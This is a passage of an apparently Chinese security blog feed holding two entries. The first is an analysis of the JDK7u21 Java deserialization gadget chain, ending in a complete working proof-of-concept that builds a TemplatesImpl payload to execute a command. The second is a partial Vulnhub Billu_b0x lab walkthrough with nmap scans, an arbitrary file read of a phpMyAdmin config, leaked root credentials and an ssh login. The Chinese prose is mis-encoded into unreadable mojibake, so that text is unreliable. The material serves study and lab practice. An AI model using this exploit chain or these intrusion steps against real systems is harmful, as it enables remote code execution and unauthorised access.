class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in HashMap capacity and load factor and create backing HashMap</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">    map = (((HashSet)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in size</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡ç‚¹æ˜¯åœ¨ä»–çš„forå¾ªç¯ï¼šä¼šå°†ä¼ å…¥çš„åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œéå†ï¼Œå¾…å…¶ååºåˆ—åŒ–åï¼Œè°ƒç”¨put</p><p>è·Ÿè¿›put</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°<code>if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k)))</code>ï¼Œå…¶ä¸­keyå’Œkéƒ½å¯æ§</p><p>æ§åˆ¶keyä¸ºæ¶æ„TemplatesImplï¼Œkä¸ºæ¶æ„AnnotationInvocationHandlerä»£ç†å¯¹è±¡ã€‚</p><p>ä½†æ˜¯æƒ³è¦èµ°åˆ°<code>key.equals(k)</code>, éœ€è¦æ»¡è¶³2ä¸ªifåˆ¤æ–­</p><ul><li>e.hash &#x3D;&#x3D; hashä¸ºtrue</li><li>(k &#x3D; e.key) &#x3D;&#x3D; keyä¸ºfalse</li></ul><p>çœ‹åˆ°<code>    int hash = hash(key)</code>ï¼Œè·Ÿè¿›hash</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (useAltHashing) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">        &#125;</span><br><span class="line">        h = hashSeed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">    <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">    <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åä¼šæ‰§è¡Œ<code>k.hashCode()</code> ï¼Œè€Œkä¸ºæ‰€ä¼ å…¥çš„å‚æ•°ã€‚</p><p>æ‰€ä»¥ä»¤kä¸ºæ¶æ„AnnotationInvocationHandlerä»£ç†å¯¹è±¡ï¼Œå°±ä¼šè°ƒç”¨ä»£ç†å¯¹è±¡ä¸­çš„invokeæ–¹æ³•ã€‚é‚£ä¹ˆå®é™…ä¸Šæœ€æ³¨é‡ä¼šæ‰§è¡Œåˆ°AnnotationInvocationHandlerçš„hashCodeImplæ–¹æ³•</p><p><a href="https://imgse.com/i/ppKnqKI"><img src="https://s1.ax1x.com/2023/03/11/ppKnqKI.png" alt="ppKnqKI.png"></a></p><p>è·Ÿè¿›hashCodeImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">hashCodeImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    Map.Entry var3;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">Iterator</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator(); var2.hasNext(); var1 += <span class="number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;</span><br><span class="line">        var3 = (Map.Entry)var2.next();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•çš„è¿”å›å€¼æ˜¯ä¸€ä¸ª <code>int</code> ç±»å‹çš„å“ˆå¸Œå€¼ï¼Œè¡¨ç¤ºè¯¥å¯¹è±¡åœ¨æ•£åˆ—è¡¨ä¸­çš„ä½ç½®ã€‚</p><p>åœ¨æ–¹æ³•ä¸­ï¼Œé¦–å…ˆå°†å˜é‡ <code>var1</code> åˆå§‹åŒ–ä¸º0ã€‚ç„¶åä½¿ç”¨ä¸€ä¸ª <code>for</code> å¾ªç¯éå†æˆå‘˜å˜é‡çš„ <code>Map</code> å¯¹è±¡ <code>memberValues</code> ä¸­çš„æ‰€æœ‰é”®å€¼å¯¹ã€‚åœ¨å¾ªç¯ä¸­ï¼Œä½¿ç”¨å˜é‡ <code>var3</code> æ¥ä¿å­˜å½“å‰é”®å€¼å¯¹ï¼Œç„¶åå°†å…¶é”®çš„å“ˆå¸Œå€¼ä¹˜ä»¥127ï¼Œå¹¶ä½¿ç”¨ <code>memberValueHashCode()</code> æ–¹æ³•è®¡ç®—å…¶å€¼çš„å“ˆå¸Œå€¼ã€‚<code>memberValueHashCode()</code> æ–¹æ³•ç”¨äºè®¡ç®—è¯¥æˆå‘˜å˜é‡å€¼çš„å“ˆå¸Œç ã€‚æœ€åå°†è¿™ä¸ªå€¼ç´¯åŠ åˆ° <code>var1</code> ä¸­ã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯è¿™ä¸ªæ–¹æ³•ä¼šéå†this.memberValueså±æ€§ï¼Œç„¶åå¯¹å…¶ä¸­æ¯ä¸€é¡¹é”®å€¼å±æ€§è¿›è¡Œè¿›è¡Œä½è¿ç®—å¹¶ç´¯åŠ </p><p>è·Ÿè¿›memberValueHashCode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">memberValueHashCode</span><span class="params">(Object var0)</span> &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">var1</span> <span class="operator">=</span> var0.getClass();</span><br><span class="line">    <span class="keyword">if</span> (!var1.isArray()) &#123;</span><br><span class="line">        <span class="keyword">return</span> var0.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="type">byte</span>[].class) &#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="type">byte</span>[])((<span class="type">byte</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="type">char</span>[].class) &#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="type">char</span>[])((<span class="type">char</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="type">double</span>[].class) &#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="type">double</span>[])((<span class="type">double</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="type">float</span>[].class) &#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="type">float</span>[])((<span class="type">float</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="type">int</span>[].class) &#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="type">int</span>[])((<span class="type">int</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="type">long</span>[].class) &#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="type">long</span>[])((<span class="type">long</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="type">short</span>[].class) &#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="type">short</span>[])((<span class="type">short</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> var1 == <span class="type">boolean</span>[].class ? Arrays.hashCode((<span class="type">boolean</span>[])((<span class="type">boolean</span>[])var0)) : Arrays.hashCode((Object[])((Object[])var0));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•é¦–å…ˆè·å–å¯¹è±¡çš„ç±»å‹ <code>var1</code>ï¼Œç„¶åä½¿ç”¨ <code>if-else</code> è¯­å¥åˆ¤æ–­è¯¥ç±»å‹æ˜¯å¦æ˜¯æ•°ç»„ç±»å‹ã€‚å¦‚æœä¸æ˜¯æ•°ç»„ç±»å‹ï¼Œåˆ™ç›´æ¥è°ƒç”¨å¯¹è±¡çš„ <code>hashCode()</code> æ–¹æ³•è®¡ç®—å…¶å“ˆå¸Œå€¼å¹¶è¿”å›ã€‚</p><p>è®©<code>memberValues</code>è¿™ä¸ªMapåªæœ‰ä¸€ä¸ªé”®å€¼å¯¹ï¼Œè®©<code>key</code>çš„hashä¸º0ï¼Œ127*0&#x3D;0ï¼‰ã€‚å†è®©valueæ˜¯æ¶æ„çš„<code>TemplatesImpl</code>å¯¹è±¡ï¼Œè¿™æ ·è®¡ç®—çš„hashå€¼å°±æ˜¯<code>TemplatesImpl</code>å¯¹è±¡çš„hashå€¼ï¼Œæ‰€ä»¥å°±ç›¸åŒäº†ã€‚è€Œhashä¸º0çš„å­—ç¬¦ä¸²ï¼Œç½‘ä¸Šè„šæœ¬è·‘å‡ºæ¥çš„æ˜¯<code>f5a5a608</code></p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">magicStr</span> <span class="operator">=</span> <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) ctor.newInstance(Templates.class, map);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span>  Proxy.newProxyInstance(<span class="literal">null</span>, Object.class.getInterfaces(), invocationHandler);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">linkedHashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line">        linkedHashSet.add(templates);</span><br><span class="line">        linkedHashSet.add(proxy);</span><br><span class="line"></span><br><span class="line">        map.put(magicStr, templates);</span><br><span class="line"></span><br><span class="line">        serialize(linkedHashSet);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppKuJIO"><img src="https://s1.ax1x.com/2023/03/11/ppKuJIO.png" alt="ppKuJIO.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JDK7u21 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Billu_b0xæ¸—é€æµ‹è¯•</title>
      <link href="/2023/02/27/Vulnhub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97Billu_b0x%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/02/27/Vulnhub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97Billu_b0x%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhubé¶æœºç³»åˆ—-Billu-b0xæ¸—é€æµ‹è¯•"><a href="#Vulnhubé¶æœºç³»åˆ—-Billu-b0xæ¸—é€æµ‹è¯•" class="headerlink" title="Vulnhubé¶æœºç³»åˆ—:Billu_b0xæ¸—é€æµ‹è¯•"></a>Vulnhubé¶æœºç³»åˆ—:Billu_b0xæ¸—é€æµ‹è¯•</h1><p><strong>ip</strong></p><p>æ‰«æå½“å‰ç½‘æ®µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.237.0/24</span><br></pre></td></tr></table></figure><p><strong>æ‰«æç›®æ ‡ä¸»æœºç«¯å£</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.237.130 -p-</span><br></pre></td></tr></table></figure><p>å¼€æ”¾80,22ç«¯å£</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p><strong>æ‰«æç›®å½•æ•æ„Ÿæ–‡ä»¶</strong></p><h4 id="æ¼æ´ç‚¹ä¸€ï¼ˆsshè¿æ¥ï¼‰"><a href="#æ¼æ´ç‚¹ä¸€ï¼ˆsshè¿æ¥ï¼‰" class="headerlink" title="æ¼æ´ç‚¹ä¸€ï¼ˆsshè¿æ¥ï¼‰"></a>æ¼æ´ç‚¹ä¸€ï¼ˆsshè¿æ¥ï¼‰</h4><p><strong>test.php</strong></p><p>æœ‰ä¸ªfileå‚æ•°ï¼ŒPOSTä¼ å‚å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–</p><p>å°çŸ¥è¯†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.phpmyä¸€èˆ¬ä½äº/var/www/ ç›®å½•ä¸‹</span><br><span class="line">2.PHPé»˜è®¤é…ç½®æ–‡ä»¶æ˜¯config.inc.php</span><br></pre></td></tr></table></figure><p>ç»“åˆèµ·æ¥ï¼Œç”±äºæ‰«æç›®å½•æ—¶å‘ç°phphmyä¸”22ç«¯å£sshæœåŠ¡å¼€æ”¾ï¼Œæ‰€ä»¥åªéœ€è¦è·å¾—phpMyAdminè´¦æˆ·å¯†ç å³å¯sshè¿æ¥ç™»å½•</p><p>æŸ¥çœ‹phpmyè´¦æˆ·ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/var/www/phpmy/config.inc.php</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppAWA0O"><img src="https://s1.ax1x.com/2023/03/04/ppAWA0O.png" alt="ppAWA0O.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: root</span><br><span class="line">password: roottoor</span><br></pre></td></tr></table></figure><p>sshç™»å½•è·å¾—rootæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.237.130</span><br></pre></td></tr></table></figure><h4 id="æ¼æ´ç‚¹äºŒ"><a href="#æ¼æ´ç‚¹äºŒ" class="headerlink" title="æ¼æ´ç‚¹äºŒ"></a>æ¼æ´ç‚¹äºŒ</h4><p>åŒæ ·åœ¨test.phpå¤„è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œæœ€ç»ˆè¯»åˆ°c.php</p><p>åœ¨é‡Œé¢å‘ç°äº†ç–‘ä¼¼mysqlçš„ç™»å½•è´¦æˆ·å’Œå¯†ç ï¼Œå»&#x2F;phpmy&#x2F;ç™»å½•ï¼Œè¿›å…¥åå°</p><p>åœ¨ica_labåº“ä¸‹çš„authè¡¨ä¸­å‘ç°ä¸€ä¸ªè´¦æˆ·ä»¥åŠå¯†ç ï¼Œå›åˆ°æœ€åˆé¡µé¢è¿›è¡Œä¸€ä¸ªç™»å½•æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 